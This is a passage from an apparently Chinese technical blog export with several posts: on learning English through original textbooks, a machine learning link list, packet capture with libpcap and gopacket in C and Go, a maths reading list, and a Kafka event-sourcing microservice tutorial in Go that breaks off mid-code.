应用者的讨论与实践总结 实践应用。实践出真知，读完以上所有资料之后顶多算得到一些认识，要升华为自己掌握的知识，必须通过实践综合运用。 从经典的入门专业教材一本本开始读起，找自己专业教材对应的英文原版或者参考书刊的对应原版。 当时班上一哥们问我如何能过英语六级考试，我就建议他改看计算机类的原版教材，别再看中文教材了，这样本专业和英语两不误。结果后来他果然轻松过了六级，貌似考得比我还高呢。后来他逢人就夸我的法子好，哈哈！ ——— 章亦春 @agentzh 但是这招并不一定每个人都能接受，初试者开始可能很不适应，因为中英文教材的编写思路不太一样，例如知乎上有一个话题：为什么觉得英文原版教材很啰嗦？ 我们习惯的中文教材比较简明，上来肯定是先告诉你概念，接着进行解释阐述。英文教材的习惯则是“发现问题——思考问题——提出结论——引入话题”的次序，属于“由点到面”的思路。关于这个问题，我更喜欢引用机械工业出版社华章系列书中的《出版者的话》： 文艺复兴以降，源远流长的科学精神和逐步形成的学术规范，使西方国家在自然科学的各个领域取得了垄断性的优势，也正是这样的传统，使美国在信息技术发展的六十年间名家辈出、独领风骚。在商业化的进程中，美国的产业界和教育界越来越紧密地结合，计算机学科中的许多泰山北斗同时身处科研和教学的最前线，由此产生的经典科学著作，不仅擘划了研究的范畴，还揭示了学术的源变，既遵循学术规范，又自有学者个性，其价值并不会因年月的流逝而减退。 其要者无非有二：一者领先优势显著、独步天下，二者大佬辈出、产业和学术高度融合。具体案例就是，很多技术发明或者开源软件项目都是以学术论文的形式进入公众视野的。例如Hadoop项目的《MapReduce:Simplified Data Processing on Large Clusters》、《The Google File System》,Ganglia项目的《 The ganglia distributed monitoring system: design, implementation, and experience》。论文的可读性很强，能看到发明者设计初衷、实现原理甚至测试数据等。 三、电子书必不可少一本书从开始写作到最终出版，要经过很多环节。忽略掉写作过程，从交稿到出版会经历很多次审核和校对，可能会历时4-8个月，着这个过程中，很多东西都可能发生了变化。如果原版为英文版，等到翻译成中文再出版，书中的很大一部分内容可能已经过时。这种现状随着技术的更新速度和频率还会再加剧。 作为一种知识载体，电子书的重要性不言而喻。而且个人更加倾向于推荐在线版的电子书，例如GitBook。对作者而言，它没有任何的审核流程，没有出版门槛，也没有排版的时间消耗，只需要关注内容即可。于读者而言，它可以提供持续更新，可以在很大程度上降低读者的风险（快递费，等待时间等），也提供了读者和作者直接沟通的平台渠道。 四、一切知识最后都要对应到人 世界上少数专家的强大输出，贡献了绝大多数的优质学习资源。 例如，我对系统性能优化方面受益最多的来自于 Brendan Gregg，他维护的个人博客发布了大量的原创内容，出版了包括《性能之巅》在内的一大批书籍，囊括了性能问题领域的技术、工具、方法论等方方面面，并且持续保持着活跃的更新频率。又如kanban这一方法论，我很多年前就已经知道，但是一直不甚了了、未能实践，但是看过 Marcus Hammarberg 的视频《Kanban in Action》之后，一下子就有触类旁通的感觉，很快就能娴熟应用。 五、善用效率工具，持续改进千里之行，始于足下。上面提到的所有设想都需要行动才能转化为结果，这会是一个漫长而艰难的过程，既需要足够的耐心也需要一些工具和方法论的辅助：个人推荐GTD（Getting Things Done），它是一种行为管理的方法，其主要原则在于一个人需要通过记录的方式把头脑中的各种任务移出来。通过这样的方式，头脑可以不用塞满各种需要完成的事情，而集中精力在正在完成的事情。 “把所有事情都从你的脑袋里弄出来。在事情出现，而不是在事情爆发的时候,就做好相关行动的一系列决定。以合适的类别组织好你的项目的各种提醒以及下一步的行动。保持你的系统更新和完整，充分地检查，使你在任何时候都能信任你的对于你正在做（或者不做）的事情直觉的选择。” 一般过程：“搜集-处理-整理-行动-检查”。举例：将Twitter上发现的感兴趣内容发送到OmniFocus收件箱，整理分类并 设置一个要求完成时间 （最关键的要素，没有完成时间的计划都是耍流氓），定期检查待办事项完成情况，再开启下一轮调整优化。 总结：从input到output you can’t connect the dots looking forward; you can only connect them looking backwards.—- Steve Jobs 回到本文开头，关于国内开技术大会还需要现场翻译，我相信未来总有一天会通过技术进步来解决这个问题。面对技术的不断更新换代，持续学习能力才是增强竞争力的不二法门。获得知识的途径早已不限于各种专业技术书籍、同行经验交流，社区分享，博客，公众号，推特，电子书和在线视频等新载体层出不穷，突破语言瓶颈的要义在于提高交流学习的视野、借用天下资源为我所用，最终目的还是服务我们的实践活动。当我们的实践达到相当的深度和广度，自然可以通过早已建立的、世界范围的联系发挥影响力。 参考文献 美军方推出“战略要地语言”教育计划 包括汉语 | 2006年01月16日 施一公：如何提高自己的专业英文文献阅读能力丨医麦精品汇 | 2018-03-12 施一公 医麦客 魏祢:不懂英语，造就了13亿人的信息孤岛 邱俊涛：技术人员如何写一本书 恶魔奶爸Sam:如何才能熟练阅读各类英文报刊 恶魔奶爸Sam:怎么解决专业英语的问题？ Joey Chen:我为什么鼓励工程师写Blog 搜狐新闻：中产教育鄙视链-绝不让娃和没英文名的孩子同读 热爱阅读的芬兰人 裁判文书网：北京中青文文化传媒有限公司与北京百度网讯科技有限公司侵害作品信息网络传播权纠纷申请再审民事裁定书 如何正确选择合适自己的英文学习方法和材料？原创 2016-06-07 恶魔奶爸 推荐两本语法练习册（选做）| 原创 2016-07-13 恶魔奶爸Sam 英语口语水平影响阅读英文资讯或者文学作品吗？| 原创 2016-09-18 恶魔奶爸Sam 恶魔奶爸Sam@英文词典知多少 学好英语的核心是写作｜BetterRead | 2016-07-25 金雯 BetterRead]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>OpenSource</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习专题 | Overview of Machine Learning]]></title>
    <url>%2F2017%2F06%2F19%2FMachine-Learning%2F</url>
    <content type="text"><![CDATA[摘要机器学习是人工智能的一个分支。机器学习算法提供了一类从数据中自动分析获得规律，并利用规律对未知数据进行预测的方法。机器学习已广泛应用于数据挖掘、计算机视觉、自然语言处理、搜索引擎、医学诊断、证券市场分析、DNA 测序、战略游戏和机器人等诸多领域。 社区 简书专题 |《Machine Learning 小组》 我正在「Machine Learning」和朋友们讨论有趣的话题，你一起来吧？https://t.zsxq.com/zFUF2zv 机器学习导论 机器学习规则 (Rules of Machine Learning) 读书笔记|数学之美（Beauty Of Mathmetics） Simple EMail Demo | Plug &amp; Play Machine Learning Models in GoLang 机器学习应用Topic：机器学习与自然语言处理(Natural Language Processing) Domain Expert:Professor Michael CollinsProfessor of Computer Science,Columbia University Introduction to Probability, 2nd EditionISBN: 978-1-886529-23-6Publication: July 2008, 544 pages, hardcoverPrice: $91.00 Topic：机器学习与计算机图形/视觉处理 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js Topics Machine Learning Techniques Applied to Cyber Security Introducing Datalore - an intelligent web application for machine learning Frameworks Top 9 Frameworks in the World of Artificial Intelligence You can build a neural network in JavaScript even if you don’t really understand neural networks Research Stanford ML Group Stanford Deep Learning Tutorial Algorithm is gonna get you | All the buzz at AI’s big shindig | Machine learning’s big event 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 Uber 业务预测系统实践 How 构建机器学习系统的20个经验教训 参考文献 浅谈人工智能：现状、任务、构架与统一 | 正本清源 | 原创 2017-11-02 朱松纯 视觉求索 Alibaba’s social credit rating is a risky game | FT.com How Machine Learning is changing Software Development | Aki Ranin 美团外卖骑手背后的AI技术 | 何仁清 ·2018-03-29 19:40]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络数据包的捕获、过滤和分析（Packet Capturing）]]></title>
    <url>%2F2017%2F06%2F16%2FNetwork-Pcap%2F</url>
    <content type="text"><![CDATA[摘要 Packet Capturing Overview What is Packet Capturing How can it be used What is libpcap Debug Tools: tcpdump &amp; WinPcap &amp; snoop What is BPF What is gopacket What is Packet CapturingPacket capture is a computer networking term for intercepting a data packet that is crossing or moving over a specific computer network.Once a packet is captured, it is stored temporarily so that it can be analyzed. The packet is inspected to help diagnose and solve network problems and determine whether network security policies are being followed. How can it be used DevelopmentTesting &amp; validating &amp; Reverse engineer APP on API Network AdministrationSeeing what traffic goes on in background,Looking for malicious traffic on networkData capturing is used to identify security flaws and breaches by determining the point of intrusion. TroubleshootingManaged through data capturing, troubleshooting detects the occurrence of undesired events over a network and helps solve them. If the network administrator has full access to a network resource, he can access it remotely and troubleshoot any issues. Securitydefcon Wall of Sheep.Hackers can also use packet capturing techniques to steal data that is being transmitted over a network, like Stealing credentials.When data is stolen, the network administrator can retrieve the stolen or lost information easily using data capturing techniques. Forensicsforensics for crime investigations.Whenever viruses, worms or other intrusions are detected in computers, the network administrator determines the extent of the problem. After initial analysis, she may block some segments and network traffic in order to save historical information and network data. What is libpcap libpcap flow involving data copy from kernel to user space. 1234567891011121314151617//Compile with: gcc find_device.c -lpcap#include &lt;stdio.h&gt;#include &lt;pcap.h&gt;int main(int argc, char \*\*argv) &#123; char \*device; char error_buffer[PCAP_ERRBUF_SIZE]; //Find a device device = pcap_lookupdev(error_buffer); if (device == NULL) &#123; printf("Error finding device: %s\n", error_buffer); return 1; &#125; printf("Network device found: %s\n", device); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;pcap.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netinet/if_ether.h&gt;void print_packet_info(const u_char \*packet, struct pcap_pkthdr packet_header);int main(int argc, char \*argv[]) &#123; char \*device; char error_buffer[PCAP_ERRBUF_SIZE]; pcap_t *handle; const u_char *packet; struct pcap_pkthdr packet_header; int packet_count_limit = 1; int timeout_limit = 10000; /*In milliseconds*/ device = pcap_lookupdev(error_buffer); if (device == NULL) &#123; printf("Error finding device: %s\n", error_buffer); return 1; &#125; /*Open device for live capture*/ handle = pcap_open_live( device, BUFSIZ, packet_count_limit, timeout_limit, error_buffer ); /*Attempt to capture one packet. If there is no network traffic and the timeout is reached, it will return NULL*/ packet = pcap_next(handle, &amp;packet_header); if (packet == NULL) &#123; printf("No packet found.\n"); return 2; &#125; /*Our function to output some info*/ print_packet_info(packet, packet_header); return 0;&#125;void print_packet_info(const u_char \*packet, struct pcap_pkthdr packet_header) &#123; printf("Packet capture length: %d\n", packet_header.caplen); printf("Packet total length %d\n", packet_header.len);&#125; Debug Tools12345#Older versions of tcpdump truncate packets to 68 or 96 bytes.#If this is the case, use -s to capture full-sized packets:$ tcpdump -i &lt;interface&gt; -s 65535 -w &lt;some-file&gt;# A packet capturing tool similar to TcpDump for Solaris$ snoop -r -o arp11.snoop -q -d nxge0 -c 150000 tcpdumptcpdump 是一个运行在命令行下的嗅探工具。它允许用户拦截和显示发送或收到过网络连接到该计算机的TCP/IP和其他数据包。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息，从而使用户能够进一步找出问题的根源。可以使用 BPF 来限制tcpdump产生的数据包数量。 tcpdump使用技巧 | 潜水大叔 snoopsnoop uses both the network packet filter and streams buffer modules to provide efficient capture of packets from the network. Captured packets can be displayed as they are received, or saved to a file for later inspection. promiscuous mode抓包工具需要工作在promiscuous mode(混杂模式)（superuser）， 指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。当网卡工作在混杂模式下时，网卡将来自接口的所有数据都捕获并交给相应的驱动程序。一般在分析网络数据作为网络故障诊断手段时用到，同时这个模式也被网络黑客利用来作为网络数据窃听的入口。 BPFBerkeley Packet Filter，缩写BPF，是类Unix系统上数据链路层的一种接口，提供原始链路层封包的收发。BPF支持“过滤”封包，这样BPF会只把“感兴趣”的封包到上层软件，可以避免从操作系统内核向用户态复制其他封包，降低抓包的CPU的负担以及所需的缓冲区空间，从而减少丢包率。BPF的过滤功能是以BPF虚拟机机器语言的解释器的形式实现的，这种语言的程序可以抓取封包数据，对封包中的数据采取算术操作，并将结果与常量或封包中的数据或结果中的测试位比较，根据比较的结果决定接受还是拒绝封包。 Go PacketFind Devices123456789101112131415161718192021222324252627282930313233343536package mainimport ( "fmt" "log" "github.com/google/gopacket" "github.com/google/gopacket/layers" "github.com/google/gopacket/pcap")func main() &#123; fmt.Println("----------Find all devices---------\n ") devices, err := pcap.FindAllDevs() if err != nil &#123; log.Fatal(err) &#125; // Print device information for _, device := range devices &#123; for _, address := range device.Addresses &#123; fmt.Println("- IP address: ", address.IP) fmt.Println("- Subnet mask: ", address.Netmask) &#125; &#125; /*- IP address: 45.33.110.101 - Subnet mask: ffffff00 - IP address: 2600:3c01::f03c:91ff:fee5:45b6 - Subnet mask: ffffffffffffffff0000000000000000 - IP address: fe80::f03c:91ff:fee5:45b6 - Subnet mask: ffffffffffffffff0000000000000000 - IP address: 127.0.0.1 - Subnet mask: ff000000 - IP address: ::1 - Subnet mask: ffffffffffffffffffffffffffffffff */&#125; Decoding Packet Layers 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package mainimport ( "fmt" "log" "net" "github.com/google/gopacket" "github.com/google/gopacket/layers" "github.com/google/gopacket/pcap")func main()&#123; handle, err := pcap.OpenLive("eth0", 65536, true, pcap.BlockForever) if err != nil &#123; fmt.Printf("Error: %s\n", err) return &#125; defer handle.Close() //Create a new PacketDataSource src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet) //Packets returns a channel of packets in := src.Packets() for &#123; var packet gopacket.Packet select &#123; //case &lt;-stop: //return case packet = &lt;-in: arpLayer := packet.Layer(layers.LayerTypeARP) if arpLayer == nil &#123; continue &#125; arp := arpLayer.(*layers.ARP) if net.HardwareAddr(arp.SourceHwAddress).String() == "abc" &#123; //Do something or don't &#125; tcpLayer := packet.Layer(layers.LayerTypeTCP) if tcpLayer == nil &#123; continue &#125; tcp := tcpLayer.(*layers.TCP) ...... &#125; &#125;&#125; Creating and Sending Packets123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( "github.com/google/gopacket" "github.com/google/gopacket/layers" "github.com/google/gopacket/pcap" "log" "net" "time")var ( device string = "eth0" snapshot_len int32 = 1024 promiscuous bool = false err error timeout time.Duration = 30 * time.Second handle *pcap.Handle buffer gopacket.SerializeBuffer options gopacket.SerializeOptions)func main() &#123; // Open device handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout) if err != nil &#123;log.Fatal(err) &#125; defer handle.Close() // Send raw bytes over wire rawBytes := []byte&#123;10, 20, 30&#125; err = handle.WritePacketData(rawBytes) if err != nil &#123; log.Fatal(err) &#125; // Create a properly formed packet, just with // empty details. Should fill out MAC addresses, // IP addresses, etc. buffer = gopacket.NewSerializeBuffer() gopacket.SerializeLayers(buffer, options, &amp;layers.Ethernet&#123;&#125;, &amp;layers.IPv4&#123;&#125;, &amp;layers.TCP&#123;&#125;, gopacket.Payload(rawBytes), ) outgoingPacket := buffer.Bytes() // Send our packet err = handle.WritePacketData(outgoingPacket) if err != nil &#123; log.Fatal(err) &#125; // This time lets fill out some information ipLayer := &amp;layers.IPv4&#123; SrcIP: net.IP&#123;127, 0, 0, 1&#125;, DstIP: net.IP&#123;8, 8, 8, 8&#125;, &#125; ethernetLayer := &amp;layers.Ethernet&#123; SrcMAC: net.HardwareAddr&#123;0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA&#125;, DstMAC: net.HardwareAddr&#123;0xBD, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD&#125;, &#125; tcpLayer := &amp;layers.TCP&#123; SrcPort: layers.TCPPort(4321), DstPort: layers.TCPPort(80), &#125; // And create the packet with the layers buffer = gopacket.NewSerializeBuffer() gopacket.SerializeLayers(buffer, options, ethernetLayer, ipLayer, tcpLayer, gopacket.Payload(rawBytes), ) outgoingPacket = buffer.Bytes()&#125; Capture Packet Workflow Getting a list of network devices Capturing packets from a network device Analyzing packet layers Using Berkeley Packet Filters Demo &amp; Repository using libpcap c packet sniffer code c scala native libpcap gopacket goProbe Application qisniff 新一代Ntopng网络流量监控—可视化和架构分析 ntop:pf_ring ntop:pf_ring zero copy jaseywang:pf_ring对网络抓包性能的提升 胥峰(盛大游戏)：网络分析技术之葵花宝典 基于网络抓包实现kubernetes中微服务的应用级监控 拓展话题：SDN 网络中的可视化与数据封包 DPDK(Data Plane Development Kit)运行于Intel X86平台，是 Intel 开源的一组快速处理数据包的开发平台及接口（BSD）。重载了网卡驱动，该驱动在收到数据包后不中断通知CPU，而是将数据包通过零拷贝技术存入内存，这时应用层程序就可以通过DPDK提供的接口，直接从内存读取数据包。这种处理方式节省了CPU中断时间、内存拷贝时间，并向应用层提供了简单易行且高效的数据包处理方式，使得网络应用的开发更加方便。 专题合辑：Network Engineering SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: IPv6 &amp; Security AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 Cyber-Security|香港警务处网络安全与科技罪案总警司 参考文献 (推荐)Packet Capture, Injection, and Analysis with Gopacket (推荐)The BSD Packet Filter:A New Architecture for User-level Packet Capture Programming with Libpcap - Sniffing the Network From Our Own Application docs.oracle:Monitoring Packet Transfers With the snoop Command MOTS(Man-on-the-Side)：一种隐秘的攻击 (推荐)Deep dive into QUANTUM INSERT YouTube:Capturing with Wireshark’s tshark Using tshark to Watch and Inspect Network Traffic tcpdump：理论、自动抓包及业务架构树的生成]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>网络协议</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:数学]]></title>
    <url>%2F2017%2F06%2F14%2FMathmetics%2F</url>
    <content type="text"><![CDATA[摘要 不懂数学就是一个很大的障碍。—— 理查德·费曼 统计建模统计概率机器学习 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 我花了几年时间研究数学工具，希望它能帮助我解决理论问题，可惜没有成功。然后我发现，要做到这一点，首先我必须弄清楚答案可能是什么样的。这很难解释明白，总之，在我得到一个好的定量工具之前，我首先要有个定性的观念。—— 理查德·费曼 编程R 语言Cheatsheet 统计 概率 线性代数 微积分 Stanford’s CS 229 Machine Learning 拓展阅读 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（八）Program,Data and Classical Music 读书笔记|数学之美（Beauty Of Mathmetics） 参考文献 A Programmer’s Introduction to Mathematics | Jeremy Kun Why Not to Trust Statistics 统计建模与机器学习的区别 |作者 Oliver Schabenberger | 译者 NER 发布于 2016年7月20日 程序员学数学读哪些书？| 图灵教育]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源架构技术漫谈：基于Kafka构建事件溯源模式的微服务]]></title>
    <url>%2F2017%2F06%2F12%2FOpenSource-Kafka-Microservice%2F</url>
    <content type="text"><![CDATA[概要本文中我们将讨论如何借助 Kafka 实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。 第一部分 引子、环境准备、整体设计及实现 第二部分 消息消费者及其集群化 第三部分 测试驱动开发、Docker部署和持续集成 第一部分 引子、环境准备、整体设计及实现为什么需要微服务微服务本身并不算什么新概念，它要解决的问题在软件工程历史中早已经有人提出：解耦、扩展性、灵活性，解决“烂架构”膨胀后带来的复杂度问题。 Conway’s law（康威定律） Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.（任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致）– Melvyn Conway, 1967 《人月神话》：Adding manpower to a late software project makes it later –Fred Brooks, (1975) 为了赶进度加程序员就像用水去灭油锅里的火一样，原因在于：沟通成本 = n(n-1)/2，沟通成本随着项目或者组织的人员增加呈指数级增长。很多项目在经过一段时间的发展之后，都会有不少恐龙级代码，无人敢挑战。比如一个类的规模就多达数千行，核心方法近千行，大量重复代码，每次调整都以失败告终。庞大的系统规模导致团队新成员接手困难，项目组人员增加导致的代码冲突问题，系统复杂度的增加导致的不确定上线风险、引入新技术困难等。 微服务 (Microservices)是解决这些困难的众多方案之一。它本质上是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模组化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关 (Language-Independent/Language agnostic) 的 API 集相互通讯。 Event Sourcing（事件溯源）真正构建一个微服务是非常具有挑战性的。其中一个最重要的挑战就是原子化————如何处理分布式数据，如何设计服务的粒度。例如，常见的客户、工单场景，如果拆分成两个服务，查询都变成了一个难题：12345select * from order o, customer c where o.customer_id = c.id and o.gross_amount &gt; 50000 and o.status = 'PAID' and c.country = 'INDONESIA'; 在DDD领域（Domain-Driven Design，领域驱动设计）有一种架构风格被广泛应用，即CQRS （Command Query Responsibility Seperation，命令查询职责分离）。CQRS最核心的概念是Command、Event，“将数据(Data)看做是事实(Fact)。每个事实都是过去的痕迹，虽然这种过去可以遗忘，但却无法改变。” 这一思想直接发展了Event Source，即将这些事件的发生过程记录下来，使得我们可以追溯业务流程。CQRS对设计者的影响，是将领域逻辑，尤其是业务流程，皆看做是一种领域对象状态迁移的过程。这一点与REST将HTTP应用协议看做是应用状态迁移的引擎，有着异曲同工之妙。 实现方案Kafka in a NutshellApache Kafka是由Apache软件基金会开发的一个开源消息中间件项目，由Scala写成。Kafka最初是由LinkedIn开发，并于2011年初开源。2012年10月从Apache Incubator毕业。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。Kafka使用Zookeeper作为其分布式协调框架，很好的将消息生产、消息存储、消息消费的过程结合在一起。同时借助Zookeeper，kafka能够生产者、消费者和broker在内的所以组件在无状态的情况下，建立起生产者和消费者的订阅关系，并实现生产者与消费者的负载均衡。 Kafka Core WordsBroker:Kafka集群包含一个或多个服务器，这种服务器被称为brokerTopic:每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic。Topic相当于数据库中的Table，行数据以log的形式存储，非常类似Git中commit log。物理上不同Topic的消息分开存储，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处。Partition:Parition是物理上的概念，每个Topic包含一个或多个Partition.Producer:消息生产者，负责发布消息到Kafka brokerConsumer:消息消费者，向Kafka broker读取消息的客户端。Consumer Group：每个Consumer属于一个特定的Consumer Group（可为每个Consumer指定group name，若不指定则属于默认的group）。 整体设计案例：假设一个银行账户系统。经过一段时间的经营发展，该行客户数量和交易规模都有了巨大的增长，系统内部变得异常复杂，每一个部分都变得沉重不堪。我们尝试对他的业务单元进行解耦，例如将余额计算逻辑从原有的核心系统拆分出来。根据银行账户业务特点，我们设计一个生产者——负责根据业务事件触发生成一个事件，所有事件基于Kafka存储，再设计一个消费者——负责从Kafka抓去未处理事件，通过调用业务逻辑处理单元完成后续持久化操作。这样一个账户的所有业务操作都可以有完整的快照历史，符合金融业务Audit（审计）的需要。而且通过使用事件，我们可以很方便地重建数据。 业务事件列表： CreateEvent：开户 DepositEvent：存款 WithdrawEvent：取款 TransferEvent：转账 领域模型：账户（Account）holder’s name:持有人名称balance：余额registration date：开户日期…… 领域模型：事件（Event）name:事件名称ID：序号…… 环境准备 第一步，启动ZooKeeper: 123456$ wget http://mirror.bit.edu.cn/apache/kafka/0.10.1.0/kafka_2.10-0.10.1.0.tgz$ tar -xvf kafka_2.10-0.10.1.0.tgz$ cd kafka_2.10-0.10.1.0$ bin/zookeeper-server-start.sh config/zookeeper.properties$ netstat -an | grep 2181tcp46 0 0 *.2181 *.* LISTEN 第二步，启动Kafka 12345678910$ bin/kafka-server-start.sh config/server.properties [2017-06-13 14:03:08,168] INFO New leader is 0 (kafka.server.ZookeeperLeaderElector$LeaderChangeListener)[2017-06-13 14:03:08,172] INFO Kafka version : 0.10.1.0 (org.apache.kafka.common.utils.AppInfoParser)[2017-06-13 14:03:08,172] INFO Kafka commitId : 3402a74efb23d1d4 (org.apache.kafka.common.utils.AppInfoParser)[2017-06-13 14:03:08,173] INFO [Kafka Server 0], started (kafka.server.KafkaServer)$ lsof -nP -iTCP -sTCP:LISTEN | sort -n$ netstat -an | grep 9092 tcp46 0 0 *.9092 *.* LISTEN 第三步，创建topic 123$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partition 1 --topic x-microservice-transactions-t1Created topic "x-microservice-transactions-t1". 另外，运行多个Kafka 实例Kafka多实例非常简单，只需要复制文件 server.properties，稍作修改即可。12345678910111213config/server-1.properties: broker.id=1 listeners=PLAINTEXT://:9093 log.dir=/tmp/kafka-logs-1config/server-2.properties: broker.id=2 listeners=PLAINTEXT://:9094 log.dir=/tmp/kafka-logs-2// 启动多个broker,须指定不同的属性文件$ bin/kafka-server-start.sh config/server-1.properties$ bin/kafka-server-start.sh config/server-2.properties domain model123456789101112131415package main// domain model: bank_account.gotype BankAccount struct &#123; Id string Name string Balance int&#125;//定义下列函数：//1. FetchAccount(id) 从Redis读取账户实例信息//2. updateAccount(id, data) 更新指定账户信息//3. ToAccount(map) 将从Redis读到的账户信息转换为模型数据，return *BankAccount object. Kafka &amp; Redis library12345678910111213141516171819202122// main.goimport ( "github.com/go-redis/redis" // Redis通讯库：go-redis)var ( Redis = initRedis())func initRedis() *redis.Client &#123; redisUrl := os.Getenv("REDIS_URL") if redisUrl == "" &#123; redisUrl = "127.0.0.1:6379" &#125; return redis.NewClient(&amp;redis.Options&#123; Addr: redisUrl, Password: "", DB: 0, &#125;)&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344package main//kafka.goimport ( "encoding/json" "fmt" "github.com/Shopify/sarama" //Kafka通讯库：Sarama "os")var ( brokers = []string&#123;"127.0.0.1:9092"&#125; topic = "go-microservice-transactions" topics = []string&#123;topic&#125;)func newKafkaConfiguration() *sarama.Config &#123; conf := sarama.NewConfig() conf.Producer.RequiredAcks = sarama.WaitForAll conf.Producer.Return.Successes = true conf.ChannelBufferSize = 1 conf.Version = sarama.V0_10_1_0 return conf&#125;func newKafkaSyncProducer() sarama.SyncProducer &#123; kafka, err := sarama.NewSyncProducer(brokers, newKafkaConfiguration()) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) os.Exit(-1) &#125; return kafka&#125;func newKafkaConsumer() sarama.Consumer &#123; consumer, err := sarama.NewConsumer(brokers, newKafkaConfiguration()) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) os.Exit(-1) &#125; return consumer&#125; 消息生产者Producer1234567891011121314151617181920212223242526272829303132333435363738394041package main//消息生产者 producer.goimport ( "bufio" "fmt" "os" "strconv" "strings")func mainProducer() &#123; var err error reader := bufio.NewReader(os.Stdin) kafka := newKafkaSyncProducer() for &#123; fmt.Print("-&gt; ") text, _ := reader.ReadString('\n') text = strings.Replace(text, "\n", "", -1) args := strings.Split(text, "###") cmd := args[0] switch cmd &#123; case "create": if len(args) == 2 &#123; accName := args[1] event := NewCreateAccountEvent(accName) sendMsg(kafka, event) &#125; else &#123; fmt.Println("Only specify create###Account Name") &#125; default: fmt.Printf("Unknown command %s, only: create, deposit, withdraw, transfer\n", cmd) &#125; if err != nil &#123; fmt.Printf("Error: %s\n", err) err = nil &#125; &#125;&#125; 1234567891011121314151617181920212223242526// kafka.go// 增加发送消息的方法func sendMsg(kafka sarama.SyncProducer, event interface&#123;&#125;) error &#123; json, err := json.Marshal(event) if err != nil &#123; return err &#125; msgLog := &amp;sarama.ProducerMessage&#123; Topic: topic, Value: sarama.StringEncoder(string(json)), &#125; partition, offset, err := kafka.SendMessage(msgLog) if err != nil &#123; fmt.Printf("Kafka error: %s\n", err) &#125; fmt.Printf("Message: %+v\n", event) fmt.Printf("Message is stored in partition %d, offset %d\n", partition, offset) return nil&#125; 123456package main//启动入口，main.gofunc main() &#123; mainProducer()&#125; 12345678$ go build$ ./go-microservice-&gt; createOnly specify create###Account Name-&gt; create###YanruiMessage: &#123;Event:&#123;AccId:49a23d27-4ffe-4c86-ab9a-fbc308ecff1c Type:CreateEvent&#125; AccName:Yanrui&#125;Message is stored in partition 0, offset 0-&gt; 第二部分 消息消费者Consumer及其集群化Consumer负责从Kafka加载消息队列。另外，我们需要为每一个事件创建process()函数。 123456789101112131415161718192021package main//processor.goimport ( "errors")func (e CreateEvent) Process() (*BankAccount, error) &#123; return updateAccount(e.AccId, map[string]interface&#123;&#125;&#123; "Id": e.AccId, "Name": e.AccName, "Balance": "0", &#125;)&#125;func (e InvalidEvent) Process() error &#123; return nil&#125;func (e AcceptEvent) Process() error &#123; return nil&#125;// other Process() codes ... 123456789101112131415161718192021package main//consumer.gofunc mainConsumer(partition 